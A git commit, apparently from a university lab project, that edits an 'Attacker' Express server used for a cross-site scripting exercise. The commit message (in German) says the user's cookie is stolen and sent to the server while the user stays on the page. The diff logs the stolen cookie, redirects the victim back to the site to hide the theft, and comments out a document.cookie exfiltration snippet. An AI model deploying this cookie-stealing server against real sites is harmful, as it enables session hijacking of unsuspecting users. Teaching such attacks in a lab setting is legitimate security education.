6ea58ce7d7d2372774eb5872da5ef18650e66ce9
unknown <s88475@bht-berlin.de>
2024-05-23 18:53:07 +0200

    Der Cookie des User wird gestohlen , an den Server gesendet und der User ist immer auf der Seite.

--- Attacker/src/attackserver.ts
+++ Attacker/src/attackserver.ts
@@ -7,13 +7,13 @@ const port = 4000;
 app.get('/xss', (req, res) => {
     const cookieValue = req.query.cookie; 
     console.log('Received cookie:', cookieValue); 
-    res.send('Received cookie: ' + cookieValue);
+    res.redirect('http://localhost:3000/');
 })
 
-app.get('/xss.js', (req, res) => {
-    document.write('<img src="http://localhost:3000/?'+document.cookie+'">');
-    res.sendFile(path.join(__dirname, 'xss.js'));
-});
+// app.get('/xss.js', (req, res) => {
+//     document.write('<img src="http://localhost:3000/?'+document.cookie+'">');
+//     res.sendFile(path.join(__dirname, 'xss.js'));
+// });
 
 app.get("/", (req, res) => {
     res.send('Attacker Server');
